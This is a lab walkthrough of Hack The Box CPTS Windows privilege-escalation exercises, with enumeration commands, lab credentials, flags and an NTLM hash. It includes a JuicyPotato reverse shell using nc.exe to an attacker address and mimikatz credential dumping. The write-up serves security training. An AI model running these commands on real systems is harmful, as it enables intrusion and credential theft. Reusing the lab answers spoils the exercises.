---
title: CPTS labs - 25 Windows Privilege Escalation
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - certification
  - CPTS
  - labs
---
# CPTS labs - 25 Windows Privilege Escalation

## Getting the Lay of the Land

**RDP to (ACADEMY-WINLPE-SRV01) with user "htb-student" and password "HTB_@cademy_stdnt!". What is the IP address of the other NIC attached to the target host?**

``` powershell
ipconfig /all
```

Results: 172.16.20.45

**What executable other than cmd.exe is blocked by AppLocker?**

We list the AppLocker Rules:

``` powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

Results: powershell_ise.exe


**What non-default privilege does the htb-student user have?**

```powershell
C:\Windows\system32>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled
```

Results: SeTakeOwnershipPrivilege

**Who is a member of the Backup Operators group?**

```powershell
net localgroup "Backup Operators"
```

Results: sarah


**What service is listening on port 8080 (service name not the executable)?**

```powershell
tasklist /svc
```

Results: Tomcat8


**What user is logged in to the target host?**

```powershell
query user
```

Results:  sccm_svc


**What type of session does this user have?**

```powershell
query user
```

Results:  console


**What service is listening on 0.0.0.0:21? (two words)**

```
tasklist /svc
```

Results: FileZilla Server

**Which account has WRITE_DAC privileges over the \pipe\SQLLocal\SQLEXPRESS01 named pipe?**

```
.\accesschk.exe -accepteula -w \pipe\SQLLocal\SQLEXPRESS01 -v
```

Results: NT SERVICE\MSSQL$SQLEXPRESS01


## Windows User Privileges

Authenticate to  with user "sql_dev" and password "Str0ng_P@ssw0rd!". Escalate privileges using one of the methods shown in this section. Submit the contents of the flag file located at c:\Users\Administrator\Desktop\SeImpersonate\flag.txt

```
# As I was not able to RDP using the sql_dev account. I connected with htb-student and ran cmd as sql_dev.
xfreerdp /v:10.129.43.43 /u:sql_dev /p:'Str0ng_P@ssw0rd!' /cert:ignore

# Another alternative:
mssqlclient.py sql_dev@10.129.43.43 -windows-auth
# Enter password: Str0ng_P@ssw0rd

# Enabling xp_cmdshell
enable_xp_cmdshell

# Checking Account Privileges
xp_cmdshell whoami /priv
```

As SeImpersonatePrivilege is listed, we may impersonate a privileged account such as NT AUTHORITY\SYSTEM.

To escalate privileges using these rights, let's first download the `JuicyPotato.exe` binary and upload this and `nc.exe` to the target server. But this is already saved in the C:\Tools folder. So we will jump to the next step, start a Netcat listener on port 8443 from your attacking machine:

```
nc -lnvp 8443
```

Execute the command below where -l is the COM server listening port, -p is the program to launch (cmd.exe), -a is the argument passed to cmd.exe, and -t is the createprocess call. Below, we are telling the tool to try both the CreateProcessWithTokenW and CreateProcessAsUser functions, which need SeImpersonate or SeAssignPrimaryToken privileges respectively.

```
xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.49 8443 -e cmd.exe" -t *
```

Cat the flag:

```
type c:\Users\Administrator\Desktop\SeImpersonate\flag.txt
```

Results: F3ar_th3_p0tato!

**RDP to  with user "jordan" and password "HTB_@cademy_j0rdan!". Leverage SeDebugPrivilege rights and obtain the NTLM password hash for the sccm_svc account.**

```
xfreerdp /v:10.129.43.43 /u:jordan /p:HTB_@cademy_j0rdan! /cert:ignore

. .\psgetsys.ps1 
ImpersonateFromParentPid -ppid 612 -command "c:\Windows\System32\cmd.exe" -cmdargs ""

# Now we open mimikatz (in tools)
cd c:\Tools\mimikatz
# And browse to the tool
.\mimikatz.exe

# Impersonate as NT Authority/SYSTEM (having permissions for it).
token::elevate

# List users and hashes of the machine
lsadump::sam
```

Results: 64f12cddaa88057e06a81b54e73b949b


**RDP to (ACADEMY-WINLPE-SRV01) with user "htb-student" and password "HTB_@cademy_stdnt!". Leverage SeTakeOwnershipPrivilege rights over the file located at "C:\TakeOwn\flag.txt" and submit the contents.**

```
xfreerdp /u:htb-student /p:HTB_@cademy_stdnt! /v:10.129.43.43 /cert:ignore  
# Check permissions
whoami /priv

# In the output we can see SeTakeOwnershipPrivilege is disabled. We will use the Enable-Privilege.ps1 and the EnableAllTokenPrivs.ps1 scripts to enable it.

```

See the scripts  in [windows-user-privileges](windows-user-privileges.md)

```
# Run the scripts to enable the SeTakeOwnershipPrivilege
Import-module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1
whoami /priv
```

And now it is enabled.

```
# Check out the target file to gather a bit more information about it.
Get-ChildItem -Path 'C:\TakeOwn\flag.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}

# Checking File Ownership:
cmd /c dir /q 'C:\TakeOwn\'

# Taking Ownership of the File:
takeown /f 'C:\TakeOwn\flag.txt'

# Confirm change of ownership:
Get-ChildItem -Path 'C:\TakeOwn\flag.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}

# We need to modify ACL to get to read the file.
icacls 'C:\TakeOwn\flag.txt' /grant htb-student:F

# Print out the file
type 'C:\TakeOwn\flag.txt'
```

Results: 1m_th3_f1l3_0wn3r_n0W!


### Windows Group Privileges

